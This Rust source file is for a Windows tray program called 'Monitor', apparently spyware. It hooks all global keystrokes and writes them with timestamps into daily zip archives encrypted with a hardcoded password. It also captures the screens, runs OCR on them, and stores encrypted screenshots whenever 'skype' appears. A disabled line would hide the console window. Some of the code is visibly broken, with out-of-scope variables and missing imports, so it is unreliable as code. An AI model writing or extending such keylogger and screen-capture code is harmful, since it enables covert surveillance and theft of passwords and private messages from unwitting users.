// #![windows_subsystem = "windows"]

use core::mem::MaybeUninit;
use winapi::um::winuser;
use std::collections::HashMap;
use std::time::Instant;
use std::env;
use std::fs;
use std::fs::OpenOptions;
use std::io::prelude::*;
use std::io::Write;
use std::io::{self, BufRead, Read};
use std::io::BufReader;
use std::str;
use chrono::{Utc, DateTime};
use linkify::{LinkFinder, LinkKind};
use image::io::Reader as ImageReader;
use image::{DynamicImage, ImageBuffer};
use rusty_tesseract::{Args, Image};
use regex::RegexBuilder;
use std::sync::Mutex;
use once_cell::sync::Lazy;
use monitor::*;

const PASS: &[u8] = b"firemouses!";
static LOG_FILE: Lazy<Mutex<String>> = Lazy::new(|| Mutex::new(String::new()));
static LOGGED: Lazy<Mutex<bool>> = Lazy::new(|| Mutex::new(false));

fn main() {
    #[derive(Copy, Clone, Eq, PartialEq, Debug)]
    enum Events {
        ClickTrayIcon,
        DoubleClickTrayIcon,
        Exit,
        Item1,
        Item2,
        Item3,
        Item4,
        CheckItem1,
        SubItem1,
        SubItem2,
        SubItem3,
    }

    *LOG_FILE.lock().unwrap() = readlog("log.txt");

    let (s, r) = std::sync::mpsc::channel::<Events>();
    let icon = include_bytes!("./resources/icon1.ico");
    let icon2 = include_bytes!("./resources/icon2.ico");

    let second_icon = Icon::from_buffer(icon2, None, None).unwrap();
    let first_icon = Icon::from_buffer(icon, None, None).unwrap();

    let mut text = String::from("Hello World");

    // Needlessly complicated tray icon with all the whistles and bells
    let mut tray_icon = TrayIconBuilder::new()
        .sender(s)
        .icon_from_buffer(icon)
        .tooltip("Monitor")
        .on_click(Events::ClickTrayIcon)
        .on_double_click(Events::DoubleClickTrayIcon)
        .menu(
            MenuBuilder::new()
                .item("Replace Menu", Events::Item3)
                .item("Change Icon Green", Events::Item2)
                .item("Change Icon Red", Events::Item1)
                .separator()
                .with(MenuItem::Checkable {
                    name: "Logging".into(),
                    is_checked: true,
                    disabled: true,
                    id: Events::CheckItem1,
                    icon: None,
                })
                .submenu(
                    "Logs",
                    MenuBuilder::new()
                        .item("Documents", Events::SubItem1)
                        .item("Emails", Events::SubItem2)
                        .item("Screenshots", Events::SubItem3),
                )
                .separator()
                .item("Login", Events::Item4)
                .item("E&xit", Events::Exit),
        )
        .build()
        .unwrap();

    std::thread::spawn(move || {
        if let Err(error) = listen(track_activity) {
            println!("Error: {:?}", error)
        }
    });
    std::thread::spawn(move || {
        r.iter().for_each(|m| match m {
            Events::DoubleClickTrayIcon => {
                println!("Double click");
            }
            Events::ClickTrayIcon => {
                let start = Instant::now();
                let screens = Screen::all().unwrap();

                for screen in screens {
                    let image = screen.capture().unwrap();
                    image
                        .save(format!("target.png"))
                        .unwrap();

                    let dynamic_image = ImageReader::open("target.png")
                        .unwrap()
                        .decode()
                        .unwrap();
                    let img = Image::from_dynamic_image(&dynamic_image).unwrap();

                    // fill your own argument struct if needed
                    let image_to_string_args = Args {
                        lang: "eng".into(),
                        config_variables: HashMap::from([(
                            "tessedit_char_whitelist".into(),
                            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@$./ ?,".into(),
                        )]),
                        dpi: Some(150),
                        psm: Some(6),
                        oem: Some(3),
                    };

                    let output = rusty_tesseract::image_to_string(&img, &image_to_string_args).unwrap();
                    println!("\nThe String output is: {}", output);

                    let re =
                        RegexBuilder::new(&regex::escape("skype"))
                        .case_insensitive(true)
                        .build().unwrap();

                    let ok = re.is_match(&output);

                    if ok {
                        println!("Great works!!!");
                        doscreenshots(&dynamic_image);
                    }
                }
            }
            Events::Exit => {
                println!("Please exit");
                std::process::exit(0);
            }
            Events::Item1 => {
                tray_icon.set_icon(&second_icon).unwrap();
            }
            Events::Item2 => {
                tray_icon.set_icon(&first_icon).unwrap();
            }
            Events::Item3 => {
                tray_icon
                    .set_menu(
                        &MenuBuilder::new()
                            .item("Replace Icon", Events::Item1)
                            .item("Exit", Events::Exit),
                    )
                    .unwrap();
            }
            Events::Item4 => {
                let my = LoginWindow::new();
                if let Err(e) = my.wnd.run_main(None) {
                    eprintln!("{}", e);
                }
            }
            Events::SubItem1 => {
                let my = DocumentWindow::new();
                if let Err(e) = my.wnd.run_main(None) {
                    eprintln!("{}", e);
                }
            }
            Events::SubItem2 => {
                let my = MyWindow::new();
                if let Err(e) = my.wnd.run_main(None) {
                    eprintln!("{}", e);
                }
            }
            e => {
                println!("{:?}", e);
            }
        })
    });

    // Your applications message loop. Because all applications require an
    // application loop, you are best served using an `winit` crate.
    loop {
        unsafe {
            let mut msg = MaybeUninit::uninit();
            let bret = winuser::GetMessageA(msg.as_mut_ptr(), 0 as _, 0, 0);
            if bret > 0 {
                winuser::TranslateMessage(msg.as_ptr());
                winuser::DispatchMessageA(msg.as_ptr());
            } else {
                break;
            }
        }
    }
}

fn track_activity(event: Event) {
    match event.event_type {
        EventType::KeyPress(Key::Alt | Key::AltGr) => println!("Alt!"),
        EventType::KeyPress(Key::CapsLock) => println!("CapsLock!"),
        EventType::KeyPress(Key::ControlLeft | Key::ControlRight) => println!("Control Left/Right!"),
        EventType::KeyPress(Key::Delete) => println!("Delete!"),
        EventType::KeyPress(Key::DownArrow | Key::UpArrow | Key::LeftArrow | Key::RightArrow) => println!("Up/Down/Left/Right!"),
        EventType::KeyPress(Key::Home) => println!("Home!"),
        EventType::KeyPress(Key::Insert) => println!("Insert!"),
        EventType::KeyPress(Key::End) => println!("End!"),
        EventType::KeyPress(Key::Escape) => println!("Escape!"),
        EventType::KeyPress(Key::F1 | Key::F2 | Key::F3 | Key::F4 | Key::F5 | Key::F6 | Key::F7 | Key::F8 | Key::F9 | Key::F10 | Key::F11 | Key::F12) => println!("Fn!"),
        EventType::KeyPress(Key::MetaLeft | Key::MetaRight) => println!("Meta Left/Right!"),
        EventType::KeyPress(Key::ShiftLeft | Key::ShiftRight) => println!("Shift Left/Right!"),
        EventType::KeyPress(Key::PageUp | Key::PageDown) => println!("Page Up/Down!"),
        EventType::KeyPress(Key::ScrollLock | Key::NumLock) => println!("NumLock!"),
        EventType::KeyPress(Key::Pause | Key::PrintScreen) => println!("PrintScreen!"),
        EventType::KeyPress(Key::Return) => {
            let now = Utc::now();
            let x: String = format!("{}", now);
            let now_parsed: DateTime<Utc> = x.parse().unwrap();

            *LOG_FILE.lock().unwrap() += &(String::from("   ") + &now_parsed.to_string() + "\n");
            let logs = LOG_FILE.lock().unwrap().clone();
            *LOGGED.lock().unwrap() = true;

            dolog(logs);
        },
        EventType::KeyPress(Key::Unknown(u32)) => println!("Unknown key!"),
        EventType::KeyPress(Key) => {
            let key = event.name.unwrap();
            let old = LOG_FILE.lock().unwrap().clone();
            *LOG_FILE.lock().unwrap() += &key;
            *LOGGED.lock().unwrap() = false;
        },
        EventType::ButtonPress(button) => match button {
            Button::Left => {
                if !LOGGED.lock().unwrap().clone() {
                    *LOG_FILE.lock().unwrap() += &(String::from("   ") + &now_parsed.to_string() + "\n");
                    let logs = LOG_FILE.lock().unwrap().clone();
                    dolog(logs);
                }
            },
            Button::Middle => (),
            Button::Right => (),
            Button::Unknown(code) => (),
        },
        EventType::MouseMove{x, y} => (),
        _ => (),
    }
}

fn dolog(logs: String) -> ZipResult<()> {
    let now: DateTime<Utc> = Utc::now();
    let fname = format!("L{}.zip", now.format("%Y-%m-%d").to_string());

    let path = std::path::Path::new(&fname);
    let file = std::fs::File::create(path).unwrap();

    let mut zip = ZipWriter::new(file);

    let options = FileOptions::default()
        .compression_method(CompressionMethod::Stored)
        .unix_permissions(0o755)
        .with_deprecated_encryption(PASS);

    zip.start_file("log.txt", options);
    zip.write(logs.as_bytes());
    zip.finish();

    Ok(())
}

fn doscreenshots(image: &DynamicImage) -> ZipResult<()> {
    let now: DateTime<Utc> = Utc::now();
    let fname = format!("S{}.zip", now.format("%Y-%m-%d").to_string());

    let path = std::path::Path::new(&fname);
    let file = std::fs::File::create(path).unwrap();

    let mut zip = ZipWriter::new(file);

    let options = FileOptions::default()
        .compression_method(CompressionMethod::Stored)
        .unix_permissions(0o755)
        .with_deprecated_encryption(PASS);

    zip.start_file(now.format("%Y-%m-%d-%H:%M:%S.png").to_string(), options)?;
    zip.write_all(image.as_bytes())?;

    zip.finish()?;
    Ok(())
}

fn readlog(filename: &str) -> String {
    let now: DateTime<Utc> = Utc::now();
    let fname = format!("L{}.zip", now.format("%Y-%m-%d").to_string());
    let file = match fs::File::open(fname) {
        Ok(file) => file,
        Err(err) => {
            let x: String = format!("{}", now);
            let now_parsed: DateTime<Utc> = x.parse().unwrap();

            dolog(String::from(""));
            return String::from("");
        }
    };

    let reader = BufReader::new(file);

    let mut archive = ZipArchive::new(reader).unwrap();

    let mut file = match archive.by_name_decrypt(&filename, PASS) {
        Ok(file) => file.unwrap(),
        Err(..) => {
            println!("File {} not found in the zip.", filename);
            return String::from("");
        }
    };

    let mut contents = String::new();
    file.read_to_string(&mut contents).unwrap();
    contents
}

fn links(text: String) -> String {
    let mut finder = LinkFinder::new();
    finder.kinds(&[LinkKind::Email]);
    let links: Vec<_> = finder.links(&text).collect();
    let text = links.into_iter().map(|c| c.as_str().to_owned() + "\n").collect::<String>();
    text
}